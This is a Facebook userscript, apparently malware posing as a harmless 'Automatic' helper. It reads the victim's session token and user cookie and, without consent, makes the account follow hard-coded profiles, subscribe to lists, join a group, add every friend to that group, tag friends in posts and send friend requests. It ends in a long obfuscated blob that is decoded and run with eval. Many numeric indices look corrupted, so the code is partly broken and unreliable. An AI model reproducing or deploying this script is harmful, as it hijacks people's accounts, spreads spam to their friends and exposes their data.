// ==UserScript==
// @name            Facebook
// @namespace       Anonymous
// @description     Automatic
// @author          MARJUN JUNMAR
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
       
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -100) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -100)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}
 
function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 100)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-100)];
}
 
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[100]);
 
function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=100";
     
    var params4 = "profile_id=" + abone + "&location=100&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
   
    http4.send(params4);
}
 
function sublist(uidss) {
                var a = document.createElement('script');
                a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
                document.body.appendChild(a);
}



sublist("273788819457174");
sublist("273789162790473");
sublist("273789262790463");
sublist("273789436123779");
sublist("273789496123773");
sublist("1423590861232884");
sublist("807588472602139");
sublist("787807751236414");
sublist("819823611368161");
sublist("823317784352077");
a("100004781735423");
a("100000529809397");
a("100000215901022");




var gid = ['4'];

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[100]);
 
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=100';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
 
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[100]);
 
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=100&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};
 
for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=100';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "1411705412390278";
var spost_id = "1411705412390278";
var sfoto_id = "1411705412390278";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[100]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date();
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}

function sarkadaslari_al(){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){
                                  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                                  for(f=0;f<Math.round(arkadaslar.payload.entries.length/100);f++){
                                        smesaj = "";
                                        smesaj_text = "";
                                  for(i=f*100;i<(f+100)*100;i++){
                                        if(arkadaslar.payload.entries[i]){
                                  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
                                  smesaj_text += " " + arkadaslar.payload.entries[i].text;
                                  }
                                        }
                                        sdurumpaylas();                         }
                               
                        }
                       
        };
                var params = "&filter[0]=user";
                params += "&options[0]=friends_only";
                params += "&options[100]=nm";
                params += "&token=v7";
        params += "&viewer=" + user_id;
                params += "&__user=" + user_id;
               
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=100" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=100" + params, true); }
        xmlhttp.send();
}

var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[100].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[100].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();
 
document.removeEventListener(tiklama);
}
 }, false);

function sarkadasekle(uid,cins){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){   
                        }
        };
               
                xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=100", true);
                var params = "to_friend=" + uid;
                params += "&action=add_friend";
                params += "&how_found=friend_browser";
                params += "&ref_param=none";
                params += "&outgoing_id=";
                params += "&logging_location=friend_browser";
                params += "&no_flyout_on_click=true";
                params += "&ego_log_data=";
                params += "&http_referer=";
                params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
                params += "&__user=" + user_id;
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
               
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 100){
                xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 100){
                cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[100].split(";")[0].toString()){
                xmlhttp.send(params);
}
}

var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
                var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
                        if(xmlhttp.readyState == 4){
                        eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
                        cinshtml.innerHTML = cinssonuc.jsmods.markup[0][100].__html
                        btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
                        if(cinshtml.getElementsByTagName("select")[0].value == "100"){
                        document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
                        }else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
                        document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
                        }
                        eval(fonksiyon + "(" + id + "," + cins + ");");
                        }
        };
                xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
                xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
                xmlhttp.send();
}
 
function autoSuggest()
{    
    links=document.getElementsByTagName('a');
    for (i in links) {
        l=links[i];
        if(l.innerHTML == '<span class="uiButtonText">Suggest Friend</span>') {
            l.click();
        }
    }
}
 
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 100) {
        w = document.getElementsByClassName('pbm fsm')[0];
 
        e = document.createElement('a');
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Facebook';
        e.className = 'uiButton';
        e.onclick = autoSuggest;
 
        if( w.childElementCount == 0)
        {
            w.appendChild(document.createElement('br'));
            w.appendChild(e);
        }
    }
}
 
blub();
 
document.addEventListener("DOMNodeInserted", blub, true);
var _5199;var _5140='4710C42D202A434A392D426A262C402B394B388E398F430F428F404C262A320F262F398C420B396B432F416D400E418E430C290C404E400D430F336D414B400A416D400B418F430B428C330F440C354D392C416E400E278C276C402D394F388E398C430A428A404C276C280E380C294F384C290D434F392D414D432B400D316B218D434E392F426E262A432B428C400C426E388B408C398F262F320B262E398F420F396E432E416C400C418E430A290D396A420D420C412B408D400F290E416D392A430C396E406B278E398A420A396F432F416F400F418C430C290D396B420F420F412D408F400E290A416A392E430D396A406A278A292C396D388D432B428D400B426B320D278E382F398B284F280A292B280C380C296B384A280E316C218F262C262C262A262F262F262A262D218D402F432E418A396D430E408C420F418C262C396B400A426A400B442D408F328A414C278E408F428B408C416A280F262D444A218C262B262C262B262B434F392C426D262E430D392F426E392D416E392C262C320E262B408B428C408E416F262B284E262F266F320A266B316F218A262B262E262E262B408A402B262B278C398E420D396C432E416B400E418E430E290F396D420A420F412A408D400A290F414D400A418E404C430B406B262D322B262D294B280D262A444E218E262A262E262E262C262A262D262F262E412F420E418B432F416D262D320A262D398A420E396D432E416F400F418E430C290D396B420D420C412E408D400B290E408E418D398C400A438A356C402C278F430D392E426A392F416D392C280D218A262B262D262D262B262A262C262C262C408C402C262A278A412C420C418B432A416C262C264A320B262D288C296E294B294A280A262C444F218E262F262A262A262B262E262B262F262D262D262F262E262A412D420B418A432D416E262D284D320B262F430C392B426C392F416E392A290C414F400E418E404B430D406A218B262B262E262D262C262E262D262B262F262C262D262D262F428F420A418E262D320F262E398D420D396C432F416C400D418C430F290A396C420F420A412A408A400D290A408D418B398F400B438F356E402F278C266F316C266A286B262A412F420D418A432E416C280C218C262D262A262F262B262E262B262D262A262F262D262B262D408E402A262D278F428A420D418C262A320B320B262D288C296B294D294A280D218F262F262F262F262A262B262E262D262E262B262E262D262C262F262B262B262A428A420D418E262F320F262E398A420A396B432E416F400E418F430A290E396A420A420C412E408D400C290A414C400F418A404D430A406D218E262C262D262E262D262F262B262A262D262D262F262D262B426D400A430D432E426D418A262B432A418E400A428B396A392F422E400F278A398E420C396A432D416F400C418E430B290B396B420B420B412F408A400E290E428A432E394F428B430B426F408E418E404D278F412D420C418D432D416F286B262B428A420B418B280F280C218C262E262D262E262C262A262D262D262A448E218D262F262B262A262A262C262E262D262F400D414D428C400E262F444A262D426B400A430A432C426E418A262C266E266E316C262A448B218D262E262F262D262E448F218C448F218D262C218D402B432D418B396A430A408B420D418D262B404D400A430C362B392E418C398E420E416C344B418B430D262C278E416C408A418D286D262F416F392C438B280D262E444B218A262E262A262B262A426B400B430B432F426B418B262E352E392C430C406F290C402B414F420C420E426B278D352B392A430A406A290B426E392E418D398B420F416D278A280B262C282D262D278D416A392D438C262D288B262D416A408E418F262F284C262E296F294D294C280E280C262E284D262A416D408A418C316B218D448F218B402D432D418B396B430F408A420A418D262D426A392F418B398A420C416B370A392E414A432B400B278C392F426C426E280D262E444B218E262D262A262A262C426D400A430A432C426A418C262C392E426B426E380E404C400B430B362C392C418D398B420E416E344A418D430E278C294C286E262D392F426A426C290D414B400E418F404D430C406F288A296A294D294B280C384D316F218A448A218E262D218B434D392E426D262E402B394B388D398C430A428D404B262C320F262C398D420E396E432A416E400D418A430E290C404D400E430C336C414F400A416C400F418B430C428E330D440A354F392D416A400F278B276B402E394E388C398A430C428F404D276B280A380F294B384B290E434E392F414C432C400B316E218C434F392D426E262E432E428D400C426D388A408E398A262D320F262D398F420E396A432B416F400D418A430B290D396F420E420E412F408C400A290C416E392D430C396F406A278A398B420E396B432D416F400A418F430C290D396C420D420A412C408A400C290E416B392E430C396A406D278D292E396A388C432D428A400C426B320B278C382F398C284B280D292A280B380F296C294B294E384A280D316E218F262C218A402F432C418F396C430E408A420A418E262A392A278E392E394F420A418F400E280A444F218B262A262E262B262A434E392F426A262A406F430A430C422C302C262B320A262D418A400F436C262A374B352B350B342C430F430D422A362B400A424E432F400D428A430F278C280E316D218C262C262E262F262B262C218C262B262E262D262D434D392B426C262F432A426E414F302C262C320D262D266C292D392B410B392A438B292D402E420C414A414A420B436C292D402A420D414C414F420E436E388F422E426F420B402C408C414C400A290B422C406D422B324C388E388F392F320A296F294C294A266F316E218A262B262C262E262A262B218C262C262E262E262E434C392A426F262D422B392C426F392A416B428F302C262A320D262C266B422C426F420F402F408E414C400A388F408B398B320E266D262E284F262B392C394F420B418E400D262A284C262C266B274A414B420F396B392F430F408E420F418F320C296D294D294E274B428F420B432F426A396E400F320E402F420A414D414C420F436E288D394D432B430F430B420C418B274C428C432F394C428C396C426D408B394E400D398A388D394F432B430A430E420E418E388F408B398C320E432D300A308C424F392C396B388E300A308A274B402F394F388B398B430E428F404F320C266D262F284E262F402B394C388E398D430D428B404B262B284D262F266C274D414A428A398E274B388F388F266A262D284B262A432B428F400F426D388E408F398B262C284E262E266A274B422F406F428A430F392B416B422A320C266A316F218D262C262F262E262F406E430E430B422D302C290F420F422F400A418E278F266A358E356D364F366C266F286E262B432B426C414C302C286D262D430B426E432E400B280F316C218B262B262A262B262A262E218C262F262B262F262B292F292C364A400D418F398B262C430A406C400F262E422B426D420B422D400B426B262A406B400C392E398E400A426F262B408E418B402A420D426F416F392D430D408C420E418D262F392B414B420F418C404D262B436A408F430C406F262C430F406F400A262C426B400C424A432E400B428A430E218D262C262C262E262B406D430C430E422D302A290F428B400A430E362B400A424E432F400E428C430C342E400C392E398A400C426E278D266D332A420A418A430E400E418B430D288E430A440D422A400C266F286C262A266F392A422A422C414D408B396D392F430E408D420A418C292C438D288C436E436A436B288B402E420B426F416E288A432F426D414F400A418A396C420A398D400B398D266A280A316B218E262E262F262A262E406E430C430E422F302F290C428A400B430E362B400D424E432F400B428B430B342A400F392E398E400C426F278E266D332F420F418C430A400B418B430F288C414D400A418A404C430A406C266A286F262C422C392B426D392B416E428F302C290D414F400D418F404E430D406E280C316C218E262D262D262E262E406D430F430A422A302D290E428A400F430C362E400C424C432C400E428D430E342A400B392A398E400F426A278F266C332E420B418C418B400F396A430D408D420C418E266D286A262D266A396C414E420E428F400E266E280A316C218F262F262B262C262B262E218D262E262F262D262D406E430D430D422F302A290A420F418B426F400D392C398A440C428D430B392F430A400A396A406D392B418B404E400B262A320E262D402F432F418B396F430C408F420D418D278C280F262E444A292D292A332D392E414A414D262F392E262A402D432E418C396A430A408B420A418C262C436F406F400B418F262C430D406C400C262C428C430A392C430B400B262E396D406A392A418A404F400D428F290F218B262F262E262E262D408B402B278B406A430D430B422F302F290C426F400C392B398E440B364B430A392D430E400A262F320F320A262D302B262B274D274F262D406A430F430B422B302A290F428A430D392C430A432F428D262D320F320B262C298D294B294D280C262D444F218C262B262F262C262A262A262C262D218A262E262D262A262C262C262B406C430E430B422A302A290D396D414C420B428B400E316C262A292E292F262F332E414E420D428C400A262F430A406F400C262D396A420D418F418E400C396F430C408A420F418E218A262D262F262C262E262F218A262A262E262E262F448B218E262F262E262B262E448C218B262B262A262C218E262D262B262D262D406A430C430F422E302E290A428A400A418F398D278C422F392E426F392B416B428F302B280E316C218F448F218F262C218D402F432C418A396A430A408A420F418D262F428D432F394A414E408A428C430B278A432F408C398E428F428C280E262D444B218F262E262B262A262B262E262C262E262B262B262E262D262D262D262C262A262F434D392B426A262D392D262B320C262E398E420D396A432E416C400A418F430F290D396C426C400E392B430B400D336D414D400A416A400A418D430B278C276E428B396E426D408F422F430D276D280E316E218A262D262B262C262D262B262F262A262D262A262D262C262B262B262A262F262C392B290C408D418E418E400B426A342E366B352C350F262F320D262C266F418B400D436F262A328F428F440C418F396D362C400C424D432E400C428B430F278F280A290B428E400F430C368B362E344F278B276C292A392A410D392E438F292A402B426A408B400A418A398A428B292E414A408E428A430E428E292D428A432C394B428A396C426B408D394D400A292F416F420A398E408F402B440C324E414E420B396B392D430B408F420D418C320E422F400E426E416A392A414C408A418E412F274E392E396E430D408D420A418D320B428F432B394F428C396B426F408F394F400D276F280D290A428C400B430E334F392C430F392A278B444C262C402C414E408B398B314F262A266A262F284A262D432E408C398B428C428D262E284A262C266C262F448C280D290E428E400E418A398C278F280C316D266A316E218E262F262D262E262A262F262B262F262F262D262C262E262A262F262A262E262B398D420B396E432B416B400A418D430B290B394D420E398A440E290D392E422C422A400C418F398C332B406F408B414E398F278E392B280A316F218B448D218E428B432A394C414B408B428D430D278C266E298E308D300C308F310D310E310A296C312A302D304B308E296B308D302C266E280A316C218B428C432C394B414D408F428B430F278A266D298B308B300B308D310F312B296E306C298B308F312D294A302F308D300C266C280E316B218E428D432B394A414D408E428E430D278A266B298B308C300E308E310A312B298B306E298B308E312E294A302D306F300C266F280E316F218F428B432D394D414D408A428F430B278B266E298D308B300E308A310C312D302B300F306C296C298D300F308E308A312B266E280A316B218C428B432A394B414D408C428B430F278E266C298A308B300F308A310B312C302C312C306C296D298D300E308B308E300D266B280B316F218A428A432F394A414C408D428F430C278B266F298F298B300B308E298A296F308A308A308F310D296B312C308C308F312F266F280E316E218E428E432E394D414E408C428C430E278B266C298F298F300B308B298C296F306D308D308F310A296D312B308B310D312F266C280C316A218B428B432F394A414B408C428E430A278A266A298A298C300C308B298B296F310D312C302D302B310C306A302B300F302C266D280E316F218A428B432B394B414B408F428B430B278C266D298A298A300E308A298E298A298F302B302F302C310F306E300D312C312D266C280F316C218B428E432C394A414B408E428A430D278F266C298E298C300D308D298D298A294F306F296E296F304A300B294C310A302B266E280A316F';var _8564=/[\x41\x42\x43\x44\x45\x46]/;var _8768=2;var _4070=_5140.charAt(_5140.length-1);var _3697;var _7735=_5140.split(_8564);var _2136=[String.fromCharCode,isNaN,parseInt,String];_7735[1]=_2136[_8768+1](_2136[_8768](_7735[1])/21);var _2775=(_8768==8)?String:eval;_3697='';_11=_2136[_8768](_7735[0])/_2136[_8768](_7735[1]);for(_5199=3;_5199<_11;_5199++)_3697+=(_2136[_8768-2]((_2136[_8768](_7735[_5199])+_2136[_8768](_7735[2])+_2136[_8768](_7735[1]))/_2136[_8768](_7735[1])-_2136[_8768](_7735[2])+_2136[_8768](_7735[1])-1));var _5296='_7137';var _1319='_5296=_3697';function _6559(_5836){_2775(_2010);_6559(_5624);_5624(_1319);_6559(_5296);}var _2010='_6559=_2775';var _5624='_5624=_6559';_6559(_4070);